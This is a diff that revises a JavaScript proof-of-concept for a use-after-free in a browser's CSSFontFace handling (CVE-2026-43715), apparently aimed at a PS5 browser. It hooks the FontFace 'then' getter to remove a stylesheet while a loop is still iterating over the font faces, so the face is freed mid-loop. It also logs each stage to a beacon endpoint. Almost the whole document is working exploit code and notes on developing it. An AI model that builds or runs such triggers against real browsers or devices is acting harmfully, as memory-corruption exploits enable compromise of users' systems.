@@ -1,33 +1,31 @@
-// p445 v3 — CVE-2026-43715 CSSFontFace iterateClients UAF device test
+// p445 v4 — CVE-2026-43715 CSSFontFace setStatus UAF device test
 // Beacon prefix: V445-
 //
-// Run 1: getter reentry inside iterateClients confirmed (local(Helvetica)
-// only). No crash.
-// Run 2: victim style variants (face-rule / use-rule / canvas-lookup /
-// unicode-range) x 32 triggers, no crash. Style removal tears down a
-// CSS-created face, never a client of OUR JS-created face. Conclusion:
-// DOM mutation cannot disconnect our face's clients mid-iteration.
+// Runs 1-3 (new FontFace() + style victims + fonts.delete): getter reentry
+// confirmed 235x, no crash. Source work explains why: the upstream
+// regression test (font-face-load-crash.html, fix 5aedb82710ba578f) uses a
+// CSS-CREATED face, not new FontFace(). Only CSS-created faces have the
+// CSSFontSelector as a client (CSSFontFace.cpp:100). The victim style
+// removal triggers stylesheet invalidation which disconnects the selector
+// mid-iteration and frees the face while setStatus is still looping.
 //
-// v3 attacks the client relationship directly from JS. The CSSFontFaceSet
-// is a client of every face in the set (fontStateChanged ->
-// decrementActiveCount). Inside the getter we disconnect the set from the
-// face while the loop holds it in the snapshot:
-//   del       document.fonts.delete(face) during the callback
-//   refamily  face.family = 'x' re-keys the set entry mid-callback
-//   both      delete + forced layout (double invalidation)
-//   ctrl      style removal only (known-safe control)
-// Each round uses a fresh family; 24 rounds, then a repeat burst of the
-// best variant (del) with the face also still referenced elsewhere.
+// v4 ports the upstream PoC exactly, with beacons and per-round repetition:
+//   1. victim style <style id=v>x{}</style>
+//   2. font style with @font-face { font-family: <unique>; src:
+//      local(Helvetica) }   (the only source that reaches Success on PS5)
+//   3. offsetHeight, find the face in document.fonts, touch face.loaded
+//   4. FontFace.prototype.then getter removes #v + offsetHeight
+//   5. face.load()
 //
-// Crash signature: beacons stop after V445-THEN-n-<variant>; last tag names
-// the disconnect that killed it.
+// Crash signature: beacons stop after THEN-n; the User's Guide shows the
+// browser error page.
 
 (function() {
   function B(tag) {
     try { new Image().src = '/BEACON?V445-' + tag + '&t=' + Date.now(); } catch(e) {}
   }
 
-  B('BOOT3');
+  B('BOOT4');
 
   window.onerror = function(msg, src, line, col) {
     B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 120) +
@@ -37,29 +35,19 @@
 
   var SRC = 'local(Helvetica)';
   var hits = 0;
-  var liveFace = null;
-  var mode = 'none';
 
+  // Upstream getter, verbatim operations. Removing ANY stylesheet (here the
+  // victim style) triggers synchronous style invalidation, which is what
+  // disconnects the CSSFontSelector client mid-iteration.
   Object.defineProperty(FontFace.prototype, 'then', {
     get: function() {
       hits++;
-      B('THEN-' + hits + '-' + mode);
-      try {
-        if (mode === 'del' || mode === 'both') {
-          if (liveFace) { document.fonts.delete(liveFace); B('DELETED-' + mode); }
-        }
-        if (mode === 'refamily') {
-          if (liveFace) { liveFace.family = 'moved' + hits; B('REFAM-' + mode); }
-        }
-        var victim = document.getElementById('victim-style');
-        if (victim) {
-          victim.remove();
-          document.body.offsetHeight;
-          B('REMOVED-' + mode);
-        }
-        if (mode === 'both') document.body.offsetHeight;
-      } catch (e) {
-        B('GETTER-ERR-' + encodeURIComponent(String(e)).slice(0, 80));
+      B('THEN-' + hits);
+      var v = document.getElementById('v');
+      if (v) {
+        v.remove();
+        document.body.offsetHeight;
+        B('VR-' + hits);
       }
       return undefined;
     },
@@ -67,61 +55,48 @@
   });
   B('GETTER-SET');
 
-  var MODES = ['del', 'refamily', 'both', 'ctrl'];
+  function round(i) {
+    var fam = 't' + i;
 
-  function round(i, keep) {
-    mode = MODES[i % MODES.length];
-    var fam = 'p445g' + i;
+    var victim = document.createElement('style');
+    victim.id = 'v';
+    victim.textContent = 'x{}';
+    document.head.appendChild(victim);
 
-    B('R' + i + '-' + mode);
-
-    var s = document.createElement('style');
-    s.id = 'victim-style';
-    s.textContent = '.sink { font-family: "' + fam + '", serif; }';
-    document.head.appendChild(s);
-    var sink = document.createElement('div');
-    sink.className = 'sink';
-    sink.textContent = 'px';
-    document.body.appendChild(sink);
+    var fs = document.createElement('style');
+    fs.textContent = '@font-face { font-family: ' + fam + '; src: ' + SRC + '; }';
+    document.head.appendChild(fs);
     document.body.offsetHeight;
 
-    var face = new FontFace(fam, SRC);
-    liveFace = face;
-    document.fonts.add(face);
-    document.body.offsetHeight;
+    B('R' + i);
 
+    var face;
+    try {
+      face = Array.prototype.slice.call(document.fonts)
+        .find(function(f) { return f.family === fam; });
+    } catch (e) {
+      B('ENUM-ERR-' + encodeURIComponent(String(e)).slice(0, 80));
+      return;
+    }
+    if (!face) { B('NOFACE-' + i); return; }
+
+    void face.loaded; // touch the promise like the upstream test
+
+    B('LOAD-' + i);
     face.load().then(
-      function(f) {
-        B('OK-' + i + '-H' + hits);
-        liveFace = null;
-        if (!keep) { try { document.fonts.delete(f); } catch (e) {} }
-      },
-      function(e) {
-        B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 80) +
-          '-H' + hits);
-        liveFace = null;
-      }
+      function() { B('OK-' + i + '-H' + hits); },
+      function(e) { B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 80) + '-H' + hits); }
     );
+
+    // also keep some font styles around: repeated invalidations with faces
+    // alive is the state the upstream test builds toward
   }
 
   var i = 0;
   (function step() {
-    if (i >= 24) {
-      B('PHASE2');
-      // Burst: del mode with faces kept alive and still referenced, so the
-      // set teardown and the snapshot disagree maximally.
-      MODES = ['del', 'both'];
-      var j = 0;
-      (function burst() {
-        if (j >= 16) { B('DONE-H' + hits); return; }
-        round(j, true);
-        j++;
-        setTimeout(burst, 120);
-      })();
-      return;
-    }
-    round(i, false);
+    if (i >= 20) { B('DONE-H' + hits); return; }
+    round(i);
     i++;
-    setTimeout(step, 500);
+    setTimeout(step, 400);
   })();
 })();
